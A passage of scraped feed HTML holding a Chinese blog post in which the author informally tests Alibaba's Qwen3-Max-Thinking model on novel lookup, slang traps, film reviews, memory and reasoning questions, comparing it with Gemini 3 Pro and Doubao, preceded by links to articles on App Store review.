<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FLs3su8fmMckTocPwMmFaNQ" target="_blank" title="https://mp.weixin.qq.com/s/Ls3su8fmMckTocPwMmFaNQ" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（ASO篇）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484371%26idx%3D1%26sn%3D33568c58e90a5bf4d2612d803ecb2a27%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484371&amp;idx=1&amp;sn=33568c58e90a5bf4d2612d803ecb2a27&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果加急审核是“绿色通道”还是“死亡陷阱”？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3Dea61bd42d5ae8b99d2a56cbfb8d91e88%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484362&amp;idx=1&amp;sn=ea61bd42d5ae8b99d2a56cbfb8d91e88&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果开发者邮箱，突然收到11.2通知严重么？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484413%26idx%3D1%26sn%3D82870d4c8892fa65803a8e05fd5ac938%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484413&amp;idx=1&amp;sn=82870d4c8892fa65803a8e05fd5ac938&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 不想被苹果卡审最好错开这两个提审时间</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484349%26idx%3D1%26sn%3D1c75a6b08cb5de64ddf41a88b61ff108%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484349&amp;idx=1&amp;sn=1c75a6b08cb5de64ddf41a88b61ff108&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 手撕苹果审核4.3是代码问题还是设计问题？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484344%26idx%3D1%26sn%3D4399eb8d8bf82e9c5df26a18b8564cfb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484344&amp;idx=1&amp;sn=4399eb8d8bf82e9c5df26a18b8564cfb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 有幸和Appstore审核人员进行了一场视频会议特此记录。</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[阿里发布了他们最强思考模型，有点东西。。（附实测）]]></title>    <link>https://juejin.cn/post/7602146335216549928</link>    <guid>https://juejin.cn/post/7602146335216549928</guid>    <pubDate>2026-02-03T05:55:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602146335216549928" data-draft-id="7602146335216435240" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="阿里发布了他们最强思考模型，有点东西。。（附实测）"/> <meta itemprop="keywords" content="AIGC,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T05:55:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI袋鼠帝"/> <meta itemprop="url" content="https://juejin.cn/user/2032372037988990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            阿里发布了他们最强思考模型，有点东西。。（附实测）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2032372037988990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI袋鼠帝
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:55:26.000Z" title="Tue Feb 03 2026 05:55:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是熬夜追新模型的袋鼠帝。</p>
<p>昨天晚上，我正准备关电脑睡觉，阿里突然甩出了一个重磅炸弹：Qwen3-Max-Thinking 正式发布。</p>
<p>我看完，反手就点赞+在看</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8a1b4a4b0264616a588a0f98d44c3d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=SA4QEEvDILke6R9zQ0tmZet3%2FUM%3D" alt="图片" loading="lazy"/></p>
<p>不过，说什么数字游民，自由职业，其实我的作息完全掌握 AI 手里。 </p>
<p>AI一进化，我就得起来干活。。。</p>
<p>吐槽归吐槽，身体还是很诚实的。</p>
<p>毕竟作为国产模型之光，千问每一次更新都挺让人期待的。</p>
<p>于是我立马不困了，爬起来连夜实测，看看这次能想会干，比强更强到底怎么样。</p>
<p>Max都是旗舰级的闭源模型，所以性能会更强劲</p>
<p>这次Qwen3-Max-Thinking号称性能媲美 GPT-5.2 和 Gemini 3 Pro，特别是在数学、代码和长逻辑推理上有了质的飞跃。</p>
<p>最关键的是，它的 Agent 能力大幅增强，能像真人一样边用工具边思考，而且幻觉更少。</p>
<p>🤔那岂不是非常适合接入最近爆火的个人AI助手clawdbot中使用？</p>
<blockquote>
<p>介绍clawdbot，以及如何安装使用</p>
<p>袋鼠帝，公众号：袋鼠帝AI客栈开源AI助手 ClawdBot 火爆全网，已狂飙50K Star！附喂饭级安装使用教程</p>
</blockquote>
<p>再给大家聊聊这次更新的核心技术亮点（我觉得非常实用），非常重要：</p>
<p>能看到阿里这次在 Reasoning（推理）路线上走出了一条非常独特的路径。</p>
<ol>
<li>测试时扩展（Test-Time Scaling）：从"人海战术"转向深度反思</li>
</ol>
<p>传统的推理增强往往采用并行采样（Parallel Sampling）策略，即 Best-of-N，通过生成多条推理路径再进行投票或打分。</p>
<p>这种方式虽然有效，但计算冗余极高，边际效应递减明显。 </p>
<p>Qwen3-Max-Thinking 采用了一种“经验累积式迭代”策略。</p>
<p>它利用“经验提取（Experience Extraction）”机制，将上一轮推理中的关键洞见（Insight）提炼出来，注入到下一轮的 Context 中。这使得模型能够在不增加 Token 消耗量级的情况下，通过自我反思修正错误，收敛至更优解。</p>
<p>就好比一些模型解难题，就像是让 100 个普通学生同时做同一道题，然后看谁的答案对（人海战术，浪费资源且容易大家都做错）。 </p>
<p>Qwen3-Max-Thinking像是一个资深学霸，做题时会先打草稿，发现第一步思路不对，立刻总结教训，换个思路继续推导，直到解出答案。</p>
<p>不是一直试错，是在迭代。</p>
<ol start="2">
<li>自适应工具调用：原生Agent的肌肉记忆</li>
</ol>
<p>大多数模型的工具调用依赖于 Prompt Engineering（提示词工程），即告诉模型你有xxx工具，能干什么，请使用它。 </p>
<p>Qwen3-Max-Thinking这次通过大规模的RL（强化学习）后训练，将工具调用内化为模型的原生能力。</p>
<p>它不再需要显式的Trigger，而是基于对任务复杂度的感知，自主决策何时挂起推理、调用 Search 获取实时信息、或调用 Python 解释器进行精确计算等。</p>
<p>这种边想边做的能力，大幅降低了幻觉（Hallucination），也进一步提升了解决真实世界复杂任务的能力。</p>
<ol start="3">
<li>极致的生态兼容：可丝滑接入Claude Code</li>
</ol>
<p>这一点对于开发者至关重要：Qwen3-Max-Thinking 不仅兼容 OpenAI 协议，更原生兼容了 Anthropic API 协议。</p>
<p>这意味着它可以丝滑接入 Claude Code。只需修改 API地址 和 API Key。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d826d3d9d3284e17aea501de18d57d9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=3uqydODAMnZaHV%2BPmEF5F6VYcmk%3D" alt="图片" loading="lazy"/></p>
<p>现在Qwen3-Max-Thinking可以在网页使用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0515920fb0de4cae9ff715edc3e066ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=1X4uoBbNMZqIJ8RDeohMWFG0SMs%3D" alt="图片" loading="lazy"/></p>
<p>也可以通过API使用</p>
<p>接下来，老规矩，咱们直接上实测。</p>
<p>PS：Qwen3-Max-Thinking名字有点长，下文就用Qwen或者Qwen3代替了~</p>
<h3 data-id="heading-0">1.网文圈《校花的贴身高手》</h3>
<p>*由于联网搜索已经自动整合进深度思考（由Agent自行判断是否需要联网），所以只需要打开深度思考即可（看见有读者在别的公众号评论区提问，为什么没有联网搜索了）<br/>
*</p>
<p>这是一部连载了十多年的网络小说，无数人从初中到大学毕业，从乔布斯Iphone时代到LLM时代，还在看这本小说，然而此书作者依然还在日更。</p>
<p>书中剧情有一个关键节点，就是登上天阶岛，来问问Qwen是否能正确找到。</p>
<pre><code class="hljs">prompt：在网络小说，校花的贴身高手中，主角是在哪一章登上天阶岛的？
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52e7761a2d6c43c285c0c706beb0e0a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=3Nlh0fiCTz5D%2Fr2p%2Bzxs0v0NAL0%3D" alt="图片" loading="lazy"/></p>
<p>有意思的是，查看思维链，可以看见，Qwen3-Max-Thinking会有意识地交叉对比不同的结果，防止被干扰，并且思考后给出章节不同的原因和结论，让人感觉非常可靠。</p>
<p>我去QQ阅读APP核实了一下，是正确的</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/155c19e37f8d4a2fb825cbe5740093eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=BR94cgpBVSM0dxnteKZzYHZ0tDw%3D" alt="图片" loading="lazy"/></p>
<p>接下来我又尝试让Qwen3-Max-Thinking用代码给我画个图，看看能不能在超过2000万字的小说中找到主角实力晋升的曲线。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/beb27bbeeab341ccb67362cf24c18616~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=%2FJL%2BHuAYGPWEwZhaR%2BZLhdBVSP4%3D" alt="图片" loading="lazy"/></p>
<p>Qwen3在思维链中意识到，两千万字还是太多了，这个任务无法完成，但是基于我的意图，还是找到了具有代表性的章节和晋升节点，给我画了出来，完成任务</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75a235f8a9f944c291087d7003c149c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=T1pXHBj%2Fw2MmN%2FfbQxxylV5oZso%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-1">2.（斩杀线热梗）逻辑陷阱</h3>
<p>斩杀线最近非常火，我给Qwen3造了一个逻辑陷阱，还和豆包进行对比，看看Qwen会不会陷进去</p>
<pre><code class="hljs language-css" lang="css">prompt：牢<span class="hljs-selector-tag">a</span>是大<span class="hljs-selector-tag">a</span>股买进去之后在坐牢吗
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02e702aa619c4122ad93954c22035eac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=rOGQeeDQuYv1op4uIN37pHbEYyo%3D" alt="图片" loading="lazy"/></p>
<p>Qwen3 完全正确，一下子就意识到这是一个人的网名，然后还告诉我这是常见的误解。仔细看思维链，能发现Qwen居然搜索了x和facebook，但是豆包似乎都没触发网络搜索。这下Qwen 3的Agent能力又赢了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9caaecfd6d9547ca89f99803b464c94e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=ePs4IpKgQcxwIoQ8RxgtqWKJE%2FA%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-2">3.和Gemini 3 pro比较电影测评</h3>
<p>考验在海量信息中网络搜索真相，这点完胜Gemini 3 pro</p>
<p>前两天“重返寂静岭”上映，第一时间就去看了，没想到是烂片，</p>
<p>只能说被吓得莫名其妙，剧情很莫名其妙，看不懂，前面两个女生抱在一起，一个被吓得在刷小红书，一个被吓得在玩微信小游戏，我买的还是最中间的座位，不舍得走，但又一直被吓，主要是剧情莫名其妙。</p>
<p>马上试试AI搜索到的结果，是不是能符合我的真实体验。</p>
<p>先试了Gemini 3：根本没提到最新上映的重返寂静岭。。</p>
<p>而且搜索结果里似乎自相矛盾了，阿凡达同时出现在“值得一看“和“建议避雷”里，让人有点困惑。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16337754ccce40e3b71c26e3937bddb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=IwnV9KJaMWIV%2FNEK4eMxxEbPVTA%3D" alt="图片" loading="lazy"/></p>
<p>又试了这回的Qwen 3，因为交给Agnet自动判断是否需要网络查询了，所以我们只要打开深度思考就好了。</p>
<p>Qwen3—Max甚合我意！简直和我内心的意见一模一样（每一场我都在电影院看过了，AI和我的意见居然一样）</p>
<p>这些影评都是非常真实的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e25e4483d3494e778ac7e349bf00d796~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=z71Ox%2FGL806gbctHQ%2FYNxMvbcbA%3D" alt="图片" loading="lazy"/></p>
<p>我又点开思维链，仔细看看Qwen3具体是如何做到这一点的。</p>
<p>可以看见，Qwen 3在内置Agent的调度下，一边搜索、整理、又搜索，又整理，进行了几轮的整理，才有了最后的准确答案</p>
<p>并且在思维链中可以逐一看见被Qwen3搜索过的每一个影评网站，可以点击进去浏览，能把海量信息汇总并且找到正确的信息，确实不错。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f72f99e767b4dc5bf3b4d75a73b572f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=X0O48ojR%2FcCfxDx6oi0s%2BUDW8A0%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-3">4.记忆（功能上新，类似ChatGPT和Gemini）</h3>
<p>这次千问也终于有了记忆：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15bafe69de6f4d4aa8bb626a95985385~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=6exdsuFtJrs5ZeJj0P8fk4KC9Zc%3D" alt="图片" loading="lazy"/></p>
<p>点击头像，就能在设置里面打开或者关闭记忆。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fe9a89975ef46d08264a943902c3608~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=79GLmNm%2F8emakddlbRTO9zI09Wk%3D" alt="图片" loading="lazy"/></p>
<p>下面做了一个场景预设测试，假如我是一个高考生，平时就爱和AI介绍自己喜欢的事情。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c27b93ca1df24aac9d2edc487991af7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=JjYt8VLxZRRyUhoVmhf8RUMZ%2FQw%3D" alt="图片" loading="lazy"/></p>
<p>那么假如已经到了高考报志愿的时候，Qwen就可以根据我以往所有的聊天偏好，对我进行分析，找到最适合我的专业。（以下新开了一个聊天窗口进行测试），</p>
<p>可以看见，不给任何上下文信息，直接向Qwen 3 提问我适合什么专业。</p>
<p>Qwen 3 的回答是正确的。因为这就是我本人的真实经历，非常认同AI的判断。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33a6db2fc0a14e92858007593f5b53d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=D%2FP8qqyThkqZk4Xg2sDTGl46p7Y%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-4">5.视频总结（支持上传十分钟以内的视频）</h3>
<p>大概十秒钟，总结很顺利，比以前快多了，查看思维链，可以看见一步步梳理脉络</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f689bd8ba6004c3681c737c3ae3964ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=A%2FHsdbhexR4L8iwCOqOlhgk2WgM%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-5">6.预测26年春晚，具身智能机器人表演到什么程度</h3>
<p>时光匆匆又一年，年味渐浓</p>
<p>2026年春晚，宇树科技将第三次登上春晚的舞台。</p>
<p>去年具身智能机器人表演的是《秧BOT》，今年又会进展如何呢？</p>
<p>让Qwen3预测一下今年的具身智能机器人，在春晚的舞台上会有什么样的表演。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0c7c044eb5145e38d5c4a7a9880b04f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=c03CqPklIYEgELbmO22BBi6cx9w%3D" alt="图片" loading="lazy"/></p>
<p>到时候看Qwen3预测得准不准，春晚就揭晓！</p>
<h3 data-id="heading-6">7.公务员真题图形推理题</h3>
<p>Qwen思路和答案都完胜，gemini 3 pro居然做错了</p>
<p>纯图形题目对于只有文字输入的大模型来说是无解的</p>
<p>但是这次Qwen 3 max是可以上传视频的，来看看Qwen 3 实力如何。</p>
<p>下面是一道，公务员考试真题：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab699870426444f99ab4bfca18dfca7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=EHx3uJOHW%2FV5lBXWERYw9T921fg%3D" alt="图片" loading="lazy"/></p>
<p>如何判断这是一道好的公务员题目，就在于每个人去看了答案，都会觉得很简单，但是让你自己在考场做，就是做不出来。</p>
<p>这样的题目考验的正是公务员在为人民服务的过程中办理实事、处置突变事项、临场判断的综合素质，而不是悠哉坐在办公室里的马后炮和键盘侠。</p>
<p>正强如Gemini 3 pro也做不出来，我一点不意外。</p>
<p>但是让我很意外的是，Qwen 3 max居然做出来了</p>
<p>以下是Qwen 3 max的解题</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08231c5d629948bfa6d2a9e42a1ae0c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=UmJRNn0YrZpZN3F068LKKryoN2o%3D" alt="图片" loading="lazy"/></p>
<p>让我们点开思维链，看看Qwen 3 max是如何思考的：</p>
<p>可以看见Qwen 3 的结构化思考，完全就是一位真实的公务员考生：</p>
<p>先是分析图形变化规律、然后再尝试推导逻辑关系，然后发现了找不到这个规律，于是又返回上一层重新思考图形规律，最后找到正确思路。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3da55992f6e442fe9855edbe38f1d8f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=f9PHQwemrQIuyQ4Tckpz9c%2FbIZ8%3D" alt="图片" loading="lazy"/></p>
<p>其实最后这一句（注：）实为画龙点睛之笔，让我啧啧称奇。</p>
<p>一年几百万公务员考生不断刷题、报班、看课，就是为了找到题型规律，让自己的脑子在考场上能适应“试题模式”，从而拿高分。</p>
<p>然而，Qwen 3 轻飘飘说出这一句，于无声处听惊雷，意味着已经完全把公务员考试的出题逻辑尽在掌握。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa8b8d9ee32541bb91fd48bc766e48b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnooovpvKDluJ0=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770702925&amp;x-signature=vbtcFdzbrCRHKpkdHfoB714md6o%3D" alt="图片" loading="lazy"/></p>
<p>以下是Gemini 3 pro思考了接近4分钟后，不仅被这道题目逼出了母语英文，</p>
